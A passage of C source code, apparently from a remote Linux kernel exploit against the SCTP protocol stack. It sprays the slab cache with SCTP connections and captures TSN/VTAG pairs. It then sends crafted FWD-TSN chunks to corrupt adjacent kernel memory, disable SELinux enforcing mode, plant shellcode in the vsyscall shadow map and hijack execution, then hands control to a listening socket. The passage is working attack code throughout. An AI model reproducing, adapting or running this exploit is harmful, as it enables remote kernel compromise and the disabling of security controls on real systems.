  server_sctp.sin_family = PF_INET;
  server_sctp.sin_port = htons(h.rport); 
  server_sctp.sin_addr.s_addr = inet_addr(h.rhost);

  __msg("[**] Monitoring Network for TSN/VTAG pairs.. \n");
  ret = clone(clone_thread, clone_stack+STACK_SIZE-8, CLONE_VM|SIGCHLD, NULL);
  if(ret < 0)
    __fatal_perror("clone");
  
  sleep(1);

  __msg("[**] Start flushing slub cache...\n");
  for(i=0; i<=h.nconn; i++)
  {
    __u16 p = sport-(h.nconn-1)+i;
    if(p == sport || p== sport2)
      fd = make_sctp_connection(p, h.rport, 1);
    else 
      fd = make_sctp_connection(sport-(h.nconn-1)+i, h.rport, 0);
//    usleep(10);
  } 


  disable_abort(); 
  /* wait for monitoring engine */ 
  wait(NULL);

  if(k->allocator_type == SLAB_ALLOCATOR)
    swap_to_SLAB_chunk();
 
  if(vtag && tsn && vtag2 && tsn2)   
  {
    __u32 acc;
    
    __msg_f("[**] Using TSN/VTAG pairs: (TSN: %x <=> VTAG: %x) / (TSN: %x <=> VTAG: %x)...\n", tsn, vtag, tsn2, vtag2);
    sleep(1);

    if(k->selinux)
    {
      __msg("[**] Overwriting neightboard sctp map..\n");
      acc = (k->slubsize - k->chunksize) / 2;
      ret = build_stream(k->selinux, k->ptrsize, acc); 
      if(ret < 0)
        __fatal("Error Building Streams...");
    
      htons_streams(streams, ret);
      send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn); 

      __msg("[**] Disabling Selinux Enforcing Mode..\n");
      ret = build_stream(__zero, 4, 0);
      if(ret < 0)
        __fatal("Error Building Streams...");

      htons_streams(streams, ret);
      send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 
    }

    __msg("[**] Overwriting neightboard sctp map ......\n");
    acc = (k->slubsize - k->chunksize) / 2;
    ret = build_stream(k->vsysaddr, k->ptrsize, acc); 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn); 

    __msg("[**] Overwriting vsyscall shadow map..\n");
    acc = 0x930 / 2;
    ret = build_stream(k->scode, k->scodesize, acc); //1176 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 
     
    __msg("[**] Hijacking vsyscall shadow map..\n");
    ret = build_stream(k->vsysjump, k->vsysjumpsize, 0); 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 

    sleep(1); 
  }
  else
    __fatal("VTAG/TSN not found: network error");


  multiplex(listenfd); 
  __msg("[**] Closing Connection... \n");
  return 0;
}



